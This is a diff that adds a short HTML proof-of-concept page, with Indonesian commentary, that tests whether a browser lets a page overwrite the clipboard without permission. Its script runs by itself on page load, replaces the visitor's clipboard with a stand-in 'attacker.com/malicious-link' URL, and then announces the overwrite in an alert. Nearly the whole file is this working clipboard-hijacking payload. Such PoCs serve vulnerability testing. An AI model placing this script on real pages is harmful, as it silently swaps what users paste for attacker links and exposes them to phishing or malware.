@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Clipboard PoC</title>
+</head>
+<body>
+  <h2>Clipboard Write PoC</h2>
+  <p>Kalau browser lo vulnerable, clipboard sekarang bakal ke-replace otomatis.</p>
+
+  <script>
+    async function overwriteClipboard() {
+      try {
+        await navigator.clipboard.writeText("https://attacker.com/malicious-link");
+        console.log("Clipboard ditimpa tanpa izin 👾");
+        alert("✅ Clipboard lo udah ketimpa tanpa permission!");
+      } catch (err) {
+        console.error("Clipboard gagal:", err);
+      }
+    }
+
+    // langsung jalan pas halaman dibuka
+    overwriteClipboard();
+  </script>
+</body>
+</html>
